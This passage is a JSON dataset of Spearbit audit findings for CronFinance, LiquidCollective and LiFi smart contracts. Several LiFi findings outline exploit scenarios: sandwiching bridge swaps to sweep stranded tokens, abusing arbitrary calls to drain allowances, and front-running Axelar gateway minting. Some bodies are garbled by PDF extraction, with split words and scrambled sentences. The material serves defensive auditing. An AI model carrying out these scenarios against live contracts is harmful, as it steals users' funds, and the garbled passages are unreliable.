        "body": "The Balancer protocol utilizes two types of swaps for its functionality - GIVEN_IN and GIVEN_OUT.  GIVEN_IN specifies the minimum amount of tokens a user would accept to receive from the swap.  GIVEN_OUT specifies the maximum amount of tokens a user would accept to send for the swap. However, the onSwap function of the CronV1Pool contract only accepts the IVault.SwapKind.GIVEN_IN value as the IVault.SwapKind field of the SwapRequest struct. The unsupported SwapKind.GIVEN_OUT may limit the compatibility with Balancer on the Batch Swaps and the Smart Order Router functionality, as a single SwapKind is given as an argument.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "A pool's first LP will always take a minor loss on the value of their liquidity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The first liquidity provider for a pool will always take a small loss on the value of their tokens deposited into the pool because 1000 balancer pool tokens are minted to the zero address on the initial deposit. As most tokens have 18 decimal places, this value would be negligible in most cases, however, for tokens with a high value and small decimals the effects may be more apparent.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "The _withdrawCronFees functions should revert if no fees to withdraw",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "The _withdrawCronFees checks if there are any Cron Fees that need to be withdrawn, currently, this function does not revert in case there are no fees.",
        "labels": [
            "Spearbit",
            "CronFinance",
            "Severity: Informational"
        ]
    },
    {
        "title": "Schedule amounts cannot be revoked or released",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "The migration for schedule ids 9 to 12 has the following parameters: // 9 -> 12 migrations[3] = VestingScheduleMigration({ scheduleCount: 4, newStart: 0, newEnd: 1656626400, newLockDuration: 72403200, setCliff: true, setDuration: true, setPeriodDuration: true, ignoreGlobalUnlock: false }); The current start is 7/1/2022 0:00:00 and the updated/migrated end value would be 6/30/2022 22:00:00, this will cause _computeVestedAmount(...) to always return 0 where one is calculating the released amount due to capping the time by the end timestamp. And thus tokens would not be able to be released. Also these tokens cannot be revoked since the set [start, end] where end < start would be empty.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A revoked schedule might be able to be fully released before the 2 year global lock period",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "The unlockedAmount calculated in _computeGlobalUnlocked(...) is based on the original sched- uledAmount. If a creator revokes its revocable vesting schedule and change the end time to a new earlier date, this formula does not use the new effective amount (the total vested amount at the new end date). And so one might be able to release the vested tokens before 2 years after the lock period.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unlock date of certain vesting schedules does not meet the requirement",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "All vesting schedules should have the unlock date (start + lockDuration) set to 16/10/2024 0:00 GMT+0 post-migration. The following is the list of vesting schedules whose unlock date does not meet the requirement post-migration: Index Unlock Date 19,21,23 16/10/2024 9:00 GMT+0 36-60 16/10/2024 22:00 GMT+0",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ERC20VestableVotesUpgradeableV1._computeVestingReleasableAmount: Users VestingSchedule.releasedAmount > globalUnlocked will be temporarily denied of service with",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "The current version of the code introduces a new concept; global unlocking. The idea is that wher- ever IgnoreGlobalUnlockSchedule is set to false, the releasable amount will be the minimum value between the original vesting schedule releasable amount and the global unlocking releasable amount (the constant rate of VestingSchedule.amount / 24 for each month starting at the end of the locking period). The implementa- tion ,however, consists of an accounting error caused by a wrong implicit assumption that during the execution of _computeVestingReleasableAmount globalUnlocked should not be less than releasedAmount. In reality, how- In that case globalUnlocked - ever, this state is possible for users that had already claimed vested tokens. releasedAmount will revert for an underflow causing a delay in the vesting schedule which in the worst case may last for two years. Originally this issue was meant to be classified as medium risk but since the team stated that with the current deployment, no tokens will be released whatsoever until the upcoming upgrade of the TLC contract, we decided to classify this issue as low risk instead.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "TlcMigration.migrate: Missing input validation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "The upcoming change in some of the vesting schedules is going to be executed via the migrate function which at the current version of the code is missing necessary validation checks to make sure no erroneous values are inserted.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Optimise the release amount calculation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "In the presence of a global lock schedule one calculates the release amount as: LibUint256.min(vestedAmount - releasedAmount, globalUnlocked - releasedAmount)",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use msg.sender whenever possible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "checked to be equal to msg.sender: In this context the parameters vestingSchedule.{creator, beneficiary} have already been if (msg.sender != vestingSchedule.X) { revert LibErrors.Unauthorized(msg.sender); }",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Test function testMigrate uses outdated values for assertion",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "In commit fbcc4ddd6da325d60eda113c2b0e910aa8492b88, the newLockDuration values were up- dated in TLC_globalUnlockScheduleMigration.sol. However, the testMigrate function was not updated ac- cordingly and still compares schedule.lockDuration to the outdated newLockDuration values, resulting in failing assertions.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rounding Error in Unlocked Token Amount Calculation at ERC20VestableVotesUpgradea- ble.1.sol#L458",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "There is a rounding error in calculating the unlocked amount, which may lead to minor discrepancies in the tokens available for release.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "It might take longer than 2 years to release all the vested schedule amount after the lock period ends",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "It is possible that in the presence of the global lock, releasing the total vested value might take longer than 2 years if the lockDuration + 2 years is comparatively small when compared to duration (or start - end). We just know that after 2 years all the scheduled amount can be released but only a portion of it might have been vested.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "_computeVestingReleasableAmount's_time input parameter can be removed/inlined",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf",
        "body": "At both call sites to _computeVestingReleasableAmount(...), time is _getCurrentTime().",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "Hardcode bridge addresses via immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Most bridge facets call bridge contracts where the bridge address has been supplied as a parameter. This is inherently unsafe because any address could be called. Luckily, the called function signature is hardcoded, which reduces risk. However, it is still possible to call an unexpected function due to the potential collisions of function signatures. Users might be tricked into signing a transaction for the LiFi protocol that calls unexpected contracts. One exception is the AxelarFacet which sets the bridge addresses in initAxelar(), however this is relatively expensive as it requires an SLOAD to retrieve the bridge addresses. Note: also see \"Facets approve arbitrary addresses for ERC20 tokens\". function startBridgeTokensViaOmniBridge(..., BridgeData calldata _bridgeData) ... { ... _startBridge(_lifiData, _bridgeData, _bridgeData.amount, false); } function _startBridge(..., BridgeData calldata _bridgeData, ...) ... { IOmniBridge bridge = IOmniBridge(_bridgeData.bridge); if (LibAsset.isNativeAsset(_bridgeData.assetId)) { bridge.wrapAndRelayTokens{ ... }(...); } else { ... bridge.relayTokens(...); } ... } contract AxelarFacet { function initAxelar(address _gateway, address _gasReceiver) external { ... s.gateway = IAxelarGateway(_gateway); s.gasReceiver = IAxelarGasService(_gasReceiver); } function executeCallViaAxelar(...) ... { ... s.gasReceiver.payNativeGasForContractCall{ ... }(...); s.gateway.callContract(destinationChain, destinationAddress, payload); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Tokens are left in the protocol when the swap at the destination chain fails",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "LiFi protocol finds the best bridge route for users. In some cases, it helps users do a swap at the destination chain. With the help of the bridge protocols, LiFi protocol helps users trigger swapAndComplete- BridgeTokensVia{Services} or CompleteBridgeTokensVia{Services} at the destination chain to do the swap. Some bridge services will send the tokens directly to the receiver address when the execution fails. For example, Stargate, Amarok and NXTP do the external call in a try-catch clause and send the tokens directly to the receiver If the receiver is the Executor contract, when it fails. The tokens will stay in the LiFi protocols in this scenario. users can freely pull the tokens. Note: Exploiters can pull the tokens from LiFi protocol, Please refer to the issue Remaining tokens can be sweeped from the LiFi Diamond or the Executor , Issue #82 Exploiters can take a more aggressive strategy and force the victims swap to revert. A possible exploit scenario:  A victim wants to swap 10K optimisms BTC into Ethereum mainnet USDC.  Since dexs on mainnet have the best liquidity, LiFi protocol helps users to the swap on mainnet  The transaction on the source chain (optimism) suceed and the Bridge services try to call Complete- BridgeTokensVia{Services} on mainnet.  The exploiter builds a sandwich attack to pump the BTC price. The CompleteBridgeTokens fails since the price is bad.  The bridge service does not revert the whole transaction. Instead, it sends the BTC on the mainnet to the receiver (LiFi protocol).  The exploiter pulls tokens from the LiFi protocol.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Tokens transferred with Axelar can get lost if the destination transaction cant be executed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "If _executeWithToken() reverts then the transaction can be retried, possibly with additional gas. See axelar recovery. However there is no option to return the tokens or send them elsewhere. This means that tokens would be lost if the call cannot be made to work. contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _executeWithToken(...) ... { ... (bool success, ) = callTo.call(callData); if (!success) revert ExecutionFailed(); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Use the getStorage() / NAMESPACE pattern instead of global variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The facet DexManagerFacet and the inherited contracts Swapper.sol / SwapperV2.sol define a global variable appStorage on the first storage slot. These two overlap, which in this case is intentional. However it is dangerous to use this construction in a Diamond contract as this uses delegatecall. If any other contract uses a global variable it will overlap with appStorage with unpredictable results. This is especially impor- tant because it involves access control. For example if the contract IAxelarExecutable.sol were to be inherited in a facet, then its global variable gateway would overlap. Luckily this is currently not the case. contract DexManagerFacet { ... LibStorage internal appStorage; ... } contract Swapper is ILiFi { ... LibStorage internal appStorage; // overlaps with DexManagerFacet which is intentional ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Decrease allowance when it is already set a non-zero value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Non-standard tokens like USDT will revert the transaction when a contract or a user tries to approve an allowance when the spender allowance is already set to a non zero value. For that reason, the previous allowance should be decreased before increasing allowance in the related function.  Performing a direct overwrite of the value in the allowances mapping is susceptible to front-running scenarios by an attacker (e.g., an approved spender). As an Openzeppelin mentioned, safeApprove should only be called when setting an initial allowance or when resetting it to zero. 9 function safeApprove( IERC20 token, address spender, uint256 value ) internal { // safeApprove should only be called when setting an initial allowance, // or when resetting it to zero. To increase and decrease it, use // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' require( (value == 0) || (token.allowance(address(this), spender) == 0), \"SafeERC20: approve from non-zero to non-zero allowance\" ); _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value)); } There are four instance of this issue:  AxelarFacet.sol is directly using approve function which does not check return value of an external function. The faucet should utilize LibAsset.maxApproveERC20() function like the other faucets.  LibAsset s LibAsset.maxApproveERC20() function is used on the other faucets. For instance, USDTs ap- proval mechanism reverts if current allowance is nonzero. From that reason, the function can approve with zero first or safeIncreaseAllowance can be utilized.  FusePoolZap.sol is also using approve function which does not check return value . The contract does not import any other libraries, that being the case, the contract should use safeApprove function with approving zero.  Executor.sol is directly using approve function which does not check return value of an external function. The contract should utilize LibAsset.maxApproveERC20() function like the other contracts.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Too generic calls in GenericBridgeFacet allow stealing of tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "With the contract GenericBridgeFacet, the functions swapAndStartBridgeTokensGeneric() (via LibSwap.swap()) and _startBridge() allow arbitrary functions calls, which allow anyone to call transferFrom() and steal tokens from anyone who has given a large allowance to the LiFi protocol. This has been used to hack LiFi in the past. The followings risks also are present:  call the Lifi Diamand itself via functions that dont have nonReentrant.  perhaps cancel transfers of other users.  call functions that are protected by a check on this, like completeBridgeTokensViaStargate. 10 contract GenericBridgeFacet is ILiFi, ReentrancyGuard { function swapAndStartBridgeTokensGeneric( ... LibSwap.swap(_lifiData.transactionId, _swapData[i]); ... } function _startBridge(BridgeData memory _bridgeData) internal { ... (bool success, bytes memory res) = _bridgeData.callTo.call{ value: value ,! }(_bridgeData.callData); ... } } library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { ... (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "LiFi protocol isnt hardened",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The usage of the LiFi protocol depends largely on off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs and doesnt verify them. Several elements are not connected via smart contracts but via the API, for example:  the emits of LiFiTransferStarted versus the bridge transactions.  the fees paid to the FeeCollector versus the bridge transactions.  the Periphery contracts as defined in the PeripheryRegistryFacet versus the rest. In case the API and or frontend contain errors or are hacked then tokens could be easily lost. Also, when calling the LiFi contracts directly or via other smart contracts, it is rather trivial to commit mistakes and loose tokens. Emit data can be easily disturbed by malicious actors, making it unusable. The payment of fees can be easily circumvented by accessing the contracts directly. It is easy to make fake websites which trick users into signing transactions which seem to be for LiFi but result in loosing tokens. With the current design, the power of smart contracts isnt used and it introduces numerous risks as described in the rest of this report.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Bridge with Axelar can be stolen with malicious external call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Executor contract allows users to build an arbitrary payload external call to any address except address(erc20Proxy). erc20Proxy is not the only dangerous address to call. By building a malicious external call to Axelar gateway, exploiters can steal users funds. The Executor does swaps at the destination chain. By setting the receiver address to the Executor contract at the destination chain, Li-Fi can help users to get the best price. Executor inherits IAxelarExecutable. execute and executeWithToken validates the payload and executes the external call. IAxelarExecutable.sol#L27-L40 function executeWithToken( bytes32 commandId, string calldata sourceChain, string calldata sourceAddress, bytes calldata payload, string calldata tokenSymbol, uint256 amount ) external { bytes32 payloadHash = keccak256(payload); if (!gateway.validateContractCallAndMint(commandId, sourceChain, sourceAddress, payloadHash, ,! tokenSymbol, amount)) revert NotApprovedByGateway(); _executeWithToken(sourceChain, sourceAddress, payload, tokenSymbol, amount); } The nuance lies in the Axelar gateway AxelarGateway.sol#L133-L148. Once the receiver calls validateContract- CallAndMint with a valid payload, the gateway mints the tokens to the receiver and marks it as executed. It is the receiver contracts responsibility to execute the external call. Exploiters can build a malicious external call to trigger validateContractCallAndMint, the Axelar gateway would mint the tokens to the Executor contract. The exploiter can then pull the tokens from the Executor contract. The possible exploit scenario 1. Exploiter build a malicious external call. token.approve(address(exploiter), type(uint256).max) 2. A victim user uses the AxelarFacet to bridge tokens. Since the destination bridge has the best price, the users set the receiver to address(Executor) and finish the swap with this.swapAndCompleteBridgeTokens 3. Exploiter observes the victims bridge tx and way.validateContractCallAndMint. exploiter can pull the minted token from the executor contract since theres max allowance. The executor the minted token. builds an contract gets external call to trigger gate- The 4. The victim calls Executor.execute() with the valid payload. However, since the payload has been triggered by the exploiter, its no longer valid. 12",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: High Risk"
        ]
    },
    {
        "title": "LibSwap may pull tokens that are different from the specified asset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "LibSwap.swap is responsible for doing swaps. Its designed to swap one asset at a time. The _- swapData.callData is provided by user and the LiFi protocol only checks its signature. As a result, users can build a calldata to swap a different asset as specified. For example, the users can set fromAssetId = dai provided addLiquidity(usdc, dai, ...) as call data. The uniswap router would pull usdc and dai at the same time. If there were remaining tokens left in the LiFi protocol, users can sweep tokens from the protocol. library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { ... if (!LibAsset.isNativeAsset(fromAssetId)) { LibAsset.maxApproveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount); if (toDeposit != 0) { LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); } } else { nativeValue = fromAmount; } // solhint-disable-next-line avoid-low-level-calls (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); if (!success) { string memory reason = LibUtil.getRevertMsg(res); revert(reason); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Check slippage of swaps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Several bridges check that the output of swaps isnt 0. However it could also happen that swap give a positive output, but still lower than expected due to slippage / sandwiching / MEV. Several AMMs will have a mechanism to limit slippage, but it might be useful to add a generic mechanism as multiple swaps in sequence might have a relative large slippage. function swapAndStartBridgeTokensViaOmniBridge(...) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); if (amount == 0) { revert InvalidAmount(); } _startBridge(_lifiData, _bridgeData, amount, true); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Replace createRetryableTicketNoRefundAliasRewrite() with depositEth()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function _startBridge() of the ArbitrumBridgeFacet uses createRetryableTicketNoRefun- dAliasRewrite(). According to the docs: address-aliasing, this method skips some address rewrite magic that depositEth() does. Normally depositEth() should be used, according to the docs depositing-and-withdrawing-ether. Also this method will be deprecated after nitro: Inbox.sol#L283-L297. While the bridge doesnt do these checks of depositEth(), it is easy for developers, that call the LiFi contracts directly, to make mistakes and loose tokens. function _startBridge(...) ... { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { gatewayRouter.createRetryableTicketNoRefundAliasRewrite{ value: _amount + cost }(...); } ... ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Hardcode or whitelist the Axelar destinationAddress",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The functions executeCallViaAxelar() and executeCallWithTokenViaAxelar() call a destina- tionAddress on the destinationChain. This destinationAddress needs to have specific Axelar functions (_ex- ecute() and _executeWithTokento() ) be able to receive the calls. This is implemented in the Executor. If these functions dont exist at the destinationAddress, the transferred tokens will be lost. /// @param destinationAddress the address of the LiFi contract on the destinationChain function executeCallViaAxelar(..., string memory destinationAddress, ...) ... { ... s.gateway.callContract(destinationChain, destinationAddress, payload); } Note: the comment \"the address of the LiFi contract\" isnt clear, it could either be the LiFi Diamond or the Execu- tor.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "WormholeFacet doesnt send native token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The functions of WormholeFacet allow sending the native token, however they dont actually send it across the bridge, causing the native token to stay stuck in the LiFi Diamond and get lost for the sender. contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { function startBridgeTokensViaWormhole(... ) ... payable ... { // is payable LibAsset.depositAsset(_wormholeData.token, _wormholeData.amount); // allows native token _startBridge(_wormholeData); ... } function _startBridge(WormholeData memory _wormholeData) private { ... LibAsset.maxApproveERC20(...); // geared towards ERC20, also works when `msg.value` is set // no { value : .... } IWormholeRouter(_wormholeData.wormholeRouter).transferTokens(...); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ArbitrumBridgeFacet does not check if msg.value is enough to cover the cost",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The ArbitrumBridgeFacet does not check whether the users provided ether (msg.value) is enough to cover _amount + cost. If there are remaining ethers in LiFis LibDiamond address, exploiters can set a large cost and sweep the ether. function _startBridge( ... ) private { ... uint256 cost = _bridgeData.maxSubmissionCost + _bridgeData.maxGas * _bridgeData.maxGasPrice; if (LibAsset.isNativeAsset(_bridgeData.assetId)) { gatewayRouter.createRetryableTicketNoRefundAliasRewrite{ value: _amount + cost }( ... ); } else { gatewayRouter.outboundTransfer{ value: cost }( ... ); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Underpaying Optimism l2gas may lead to loss of funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The OptimismBridgeFacet uses Optimisms bridge with user-provided l2gas. function _startBridge( LiFiData calldata _lifiData, BridgeData calldata _bridgeData, uint256 _amount, bool _hasSourceSwap ) private { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { bridge.depositETHTo{ value: _amount }(_bridgeData.receiver, _bridgeData.l2Gas, \"\"); } else { ... bridge.depositERC20To( _bridgeData.assetId, _bridgeData.assetIdOnL2, _bridgeData.receiver, _amount, _bridgeData.l2Gas, \"\" ); } } Optimisms standard token bridge makes the cross-chain deposit by sending a cross-chain message to L2Bridge. L1StandardBridge.sol#L114-L123 17 // Construct calldata for finalizeDeposit call bytes memory message = abi.encodeWithSelector( IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.OVM_ETH, _from, _to, msg.value, _data ); // Send calldata into L2 // slither-disable-next-line reentrancy-events sendCrossDomainMessage(l2TokenBridge, _l2Gas, message); If the l2Gas is underpaid, finalizeDeposit will fail and user funds will be lost.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Funds can be locked during the recovery stage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The recovery is an address that should receive funds if the execution fails on destination do- main. This ensures that funds are never lost with failed calls. However, in the AmarokFacet It is hardcoded as msg.sender. Several unexpected behaviour can be observed with this implementation.  If the msg.sender is a smart contract, It might not be available on the destination chain.  If the msg.sender is a smart contract and deployed on the other chain, the contract maybe will not have function to withdraw native token. As a result of this implementation, funds can be locked when an execution fails. 18 contract AmarokFacet is ILiFi, SwapperV2, ReentrancyGuard { ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, relayerFee: 0, slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "What if the receiver of Axelar _executeWithToken() doesnt claim all tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function _executeWithToken() approves tokens and then calls callTo. If that contract doesnt retrieve the tokens then the tokens stay within the Executor and are lost. Also see: \"Remaining tokens can be sweeped from the LiFi Diamond or the Executor\" contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _executeWithToken(...) ... { ... // transfer received tokens to the recipient IERC20(tokenAddress).approve(callTo, amount); (bool success, ) = callTo.call(callData); ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Remaining tokens can be sweeped from the LiFi Diamond or the Executor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The initial balance of (native) tokens in both the Lifi Diamond and the Executor contract can be sweeped by all the swap functions in all the bridges, which use the following functions:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  _executeAndCheckSwaps() of SwapperV2.sol  _executeAndCheckSwaps() of Swapper.sol  swapAndCompleteBridgeTokens() of XChainExecFacet Although these functions ...  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  swapAndCompleteBridgeTokens() of XChainExecFacet have the following code: if (!LibAsset.isNativeAsset(transferredAssetId)) { startingBalance = LibAsset.getOwnBalance(transferredAssetId); // sometimes transfer tokens in } else { startingBalance = LibAsset.getOwnBalance(transferredAssetId) - msg.value; } // do swaps uint256 postSwapBalance = LibAsset.getOwnBalance(transferredAssetId); if (postSwapBalance > startingBalance) { LibAsset.transferAsset(transferredAssetId, receiver, postSwapBalance - startingBalance); } This doesnt protect the initial balance of the first tokens, because it can just be part of a swap to another token. The initial balances of intermediate tokens are not checked or protected. As there normally shouldnt be (native) tokens in the LiFi Diamond or the Executor the risk is limited. Note: set the risk to medium as there are other issues in this report that leave tokens in the contracts Although in practice there is some dust in the LiFi Diamond and the Executor:  0x362fa9d0bca5d19f743db50738345ce2b40ec99f  0x46405a9f361c1b9fc09f2c83714f806ff249dae7",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Wormhole bridge chain IDs are different than EVM chain IDs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "According to documentation, Wormhole uses different chain ids than EVM based chain ids. However, the code is implemented with block.chainid check. LiFi is integrated with third party platforms through API. The API/UI side can implement chain id checks, but direct interaction with the contract can lead to loss of funds. function _startBridge(WormholeData memory _wormholeData) private { if (block.chainid == _wormholeData.toChainId) revert CannotBridgeToSameNetwork(); } From other perspective, the following line limits the recipient address to an EVM address. done to a non EVM chain (e.g. Solana, Terra, Terra classic), then the tokens would be lost. If a bridge would be ... bytes32(uint256(uint160(_wormholeData.recipient))) ... Example transactions below.  Chainid 1 Solana  Chainid 3 Terra Classic On the other hand, the usage of the LiFi protocol depends largely on off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs. As previously mentioned, the wormhole destination chain ids are different than standard EVM based chains, the following event can be misinterpreted. ... emit LiFiTransferStarted( _lifiData.transactionId, \"wormhole\", \"\", _lifiData.integrator, _lifiData.referrer, _swapData[0].sendingAssetId, _lifiData.receivingAssetId, _wormholeData.recipient, _swapData[0].fromAmount, _wormholeData.toChainId, // It does not show correct chain id which is expected by LiFi Data Analytics true, false ,! ); ...",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Facets approve arbitrary addresses for ERC20 tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "All the facets pointed above approve an address for an ERC20 token, where both these values are provided by the user: LibAsset.maxApproveERC20(IERC20(token), router, amount); The parameter names change depending on the context. So for any ERC20 token that LifiDiamond contract holds, user can:  call any of the functions in these facets to approve another address for that token.  use the approved address to transfer tokens out of LifiDiamond contract. Note: normally there shouldnt be any tokens in the LiFi Diamond contract so the risk is limited. Note: also see \"Hardcode bridge addresses via immutable\"",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Medium Risk AcrossFacet.sol#L103, ArbitrumBridge-"
        ]
    },
    {
        "title": "FeeCollector not well integrated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
